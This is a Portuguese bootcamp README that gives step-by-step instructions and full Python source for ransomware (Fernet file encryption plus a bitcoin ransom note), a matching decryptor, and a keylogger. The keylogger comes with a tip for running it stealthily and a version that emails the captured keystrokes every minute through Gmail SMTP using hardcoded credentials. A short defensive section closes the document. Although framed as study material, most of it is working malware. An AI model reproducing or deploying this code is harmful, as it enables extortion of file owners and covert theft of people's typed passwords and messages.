# Projeto-BootCamp-Santander---Criando-Ransoware-e-Keylogger
Criando um Ransoware e um keylogger em ambiente simulado, apenas para estudo do Bootcamp Santander - Cibersegurança 2025

# 1 - Preparando a Estrutura: 
  1.1 - Instale o Vs Code 
  1.2 - Instale a Biblioteca Python
  
# 2 - Criando os diretórios arquivos 
  ### 2.1 -  Crie o diretório Malware 
  ### 2.2 - Crie um sub diretório teste_files
  ### 2.3 - Crie o arquivo Senha.txt
      insira uma senha aletório, somente para visualizarmos o funcionamento da criptografia nos teste a frente.
  ### 2.4 - Crir o arquivo dados_confidenciais 
      Insira alguns dados como nome, ou qualquert outro texto para tambpem simularmos a criptografia do ransoware.
  ### 2.5 - Criar o arquivo ransoware.py

# 3 - Criando o Código para a criptografia: 
No arquivo principal iremos informar o seguinte código: 
from cryptography.fernet import Fernet
import os

  ## 3.1. Gerar uma chave de criptografia e salvar
  
  def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)


  ## 3.2. Carregar a chave Salva 
  
  def carregar_chave():
        return open("chave.key", "rb").read()
    

  ## 3.3. Criptografar um unico arquivo 
  
  def criptografar_arquivo(arquivo, chave):
        f = Fernet(chave)
        with open(arquivo, "rb") as file:
            dados = file.read()
        dados_encriptados = f.encrypt(dados)
        with open(arquivo, "wb") as file:
                file.write(dados_encriptados)

  ## 3.4. Encontrar arquivos para criptografar
  
  def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

  ## 3.5. mensagem de resgate 
  
  def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptgrafados!\n")
        f.write("Envie 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")

  ## 3.6. Execução Principal
  
  def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
        criar_mensagem_resgate()
        print("Ransoware Executado! Arquivos Criptografados")

  if __name__=="__main__":
    main()

# 4 - Rodando o script
  Para rodar o script, abra o terminal no VS Code e execute o comando: python .\ransoware.p
  Será gerada o arquivo de "Resgate" chamdo LEIA ISSO com a seguintes mensagens:
  
          Seus arquivos foram criptgrafados!
          Envie 1 bitcoin para o endere�o X e envie o comprovante!
          Depois disso, enviaremos a chave para voc� recuperar seus dados!

# 5 - Criando o Código para a descriptografar:
  ## 5.1  Criar o arquivo descriptografar.py na raiz do VS Code

  ## 5.1 Codigo para Descripitografar o arquivo:

from cryptography.fernet import Fernet
import os
import sys

### 5.1. Carregar a Chave Salva
#### Carrega a chave de criptografia do arquivo 'chave.key'.
def carregar_chave():
    """Lê a chave binária."""
    try:
        return open("chave.key", "rb").read()
    except FileNotFoundError:
        print("Erro: O arquivo 'chave.key' não foi encontrado.")
        sys.exit(1)

### 5.2. Descriptografar um único arquivo
#### Descriptografa o arquivo e o salva de volta com o conteúdo original.
def descriptografar_arquivo(arquivo, chave):
    """Descriptografa o arquivo usando a chave Fernet."""
    f = Fernet(chave)
    
    try:
        # Lê o conteúdo criptografado
        with open(arquivo, "rb") as file:
            dados = file.read()
        
        # Descriptografa os dados e escreve de volta
        dados_descriptografados = f.decrypt(dados)
        with open(arquivo, "wb") as file:
            file.write(dados_descriptografados)
            
        print(f"Descriptografado: {arquivo}")
            
    except Exception as e:
        print(f"Erro ao descriptografar {arquivo}. Motivo: {e}")

### 5.3. Encontrar arquivos para descriptografar
#### Percorre um diretório em busca de arquivos para processar.
def encontrar_arquivos(diretorio):
    """Retorna lista de caminhos de arquivos válidos."""
    lista = []
    
    if not os.path.isdir(diretorio):
        print(f"Aviso: O diretório '{diretorio}' não foi encontrado.")
        return lista

    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            
            # Exclui o script e o arquivo de chave.
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

### 5.4. Execução Principal
#### Coordena o carregamento da chave e a descriptografia de todos os arquivos.
def main():
    """Função principal."""
    print("Iniciando Descriptografia...")
    
    # Carrega a chave
    chave = carregar_chave()
    
    # Localiza os arquivos77777
    arquivos = encontrar_arquivos("test_files")
    
    if not arquivos:
        print("Nenhum arquivo encontrado para descriptografar.")
        return

    # Processa os arquivos
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
        
    print("\n---")
    print("Arquivos restaurados com Sucesso.")

if __name__ == "__main__":
    main()



# 6 - Criando o Código para a Keylogger: 
## Criando um keylogger no arquivo keylogger.py

from pynput import keyboard # Importa a biblioteca 'keyboard' do 'pynput' para capturar eventos de teclado.

IGNORAR = { # Cria um conjunto (Set) de teclas modificadoras a serem ignoradas (não registradas).
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key): # Define a função chamada toda vez que uma tecla é pressionada.
    try:
        # Se for uma tecla normal (Letra, Numero, etc)
        # Tenta acessar o caractere da tecla (ex: 'a', '1', '!')
        with open("log.txt", "a", encoding="utf-8") as f:
                 f.write(key.char) # Escreve o caractere da tecla no arquivo.

    except AttributeError:
        # Se for uma tecla especial (Space, Enter, Shift, etc), que não tem o atributo '.char'
        with open("log.txt", "a", encoding="utf-8") as f: # Abre o arquivo 'log.txt' para adicionar conteúdo.
            if key == keyboard.Key.space:
                    f.write(" ") # Adiciona um espaço.
            elif key == keyboard.Key.enter:
                    f.write("\n") # Adiciona uma quebra de linha.
            elif key == keyboard.Key.tab:
                    f.write("\t") # Adiciona um tab.
            elif key == keyboard.Key.backspace:
                    f.write(" ") # Adiciona um espaço (não apaga, apenas registra).
            elif key == keyboard.Key.esc:
                    f.write(" [ESC] ") # Registra que a tecla ESC foi pressionada.
            elif key in IGNORAR:
                    pass # Se a tecla estiver no conjunto IGNORAR (Shift, Ctrl, Alt), não faz nada.
            else:
                    f.write(f"[{key}]") # Para outras teclas especiais (ex: F1, Home), registra o nome da tecla entre colchetes.

with keyboard.Listener(on_press=on_press) as listener: # Inicia o listener que monitora os eventos de teclado.
    listener.join() # Mantém o programa em execução, esperando que teclas sejam pressionadas.

## 6.1 - Executar: 
Para executar basta somente abrir o terminal e digitar:  python .\keylogger.py

## 6.2 Executar de forma mais "Furtiva"
Para executar de forma mais furtiva basta somente renomear o arquivo para keylogger.pyw, podendo ser renoeada direto no painel do vs code ou no terminal com o comando abaixo:

 ### ren .\keylogger.py .\keylogger.pyw


# 6.3 - Implementar o envio por e-mail:

Para configurar uma conta de teste do Gmail para uso em um aplicativo Python:

Garanta que a Validação em Duas Etapas (2FA) esteja ATIVA na sua conta de teste.

Acesse https://myaccount.google.com/apppasswords e gere uma Senha de App para o seu aplicativo Python.

Salve a Senha de App gerada (exemplo: rive meey zupp fzpl) para usá-la no seu código como a senha da sua conta de e-mail.

## Código

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""
# CONFIGURAÇÕES DE E-MAIL
EMAIL_ORIGEM = "exemplodekeylogger@gmail.com"
EMAIL_DESTINO = "exemplodekeylogger@gmail.com"
SENHA_EMAIL = "rive meey zupp fzpl"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
    log = ""

    #agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
         pass # Ignorar control, shift, etc...
        
# Inicia o keylogger e o envio automático
with keyboard.Listener(on_press=on_press) as listener:
      enviar_email()
      listener.join()


## 6.4 - Executar: 
Para executar basta somente abrir o terminal e digitar:  python .\keylogger_email.py


# 7 Como nos proteger? 

## 1. Tecnologia e Detecção

Antivírus (NGAV): Use software licenciado e atualizado com Inteligência Artificial (IA) para detectar e bloquear comportamentos suspeitos, como criptografia em massa ou captura de teclas.

Firewall: Mantenha-o ativo para bloquear a comunicação de saída não autorizada (exfiltração de dados por Keyloggers).

EDR (Monitoramento): Utilize ferramentas que monitoram o sistema continuamente para detectar e isolar imediatamente dispositivos que apresentem atividade anômala de malware.

Patches: Mantenha todos os sistemas e aplicativos 100% atualizados para fechar vulnerabilidades.

## 2. Pessoas e Cultura

Engenharia Social: Implemente treinamento contínuo para evitar que usuários cliquem em links ou baixem anexos de e-mails suspeitos (Phishing), que são a principal porta de entrada para ambos os tipos de malware.

## 3. Plano de Resposta e Backup

Sandboxing: Use ambientes isolados para analisar arquivos ou programas suspeitos, evitando que ameacem a rede principal.

Backup (Regra 3-2-1): Mantenha múltiplas cópias de seus dados, sendo que pelo menos uma deve estar offline ou imutável para que o Ransomware não consiga acessá-la.

Testes: Realize simulações de ataques e testes de restauração de backup regularmente.







                


                    

        

    

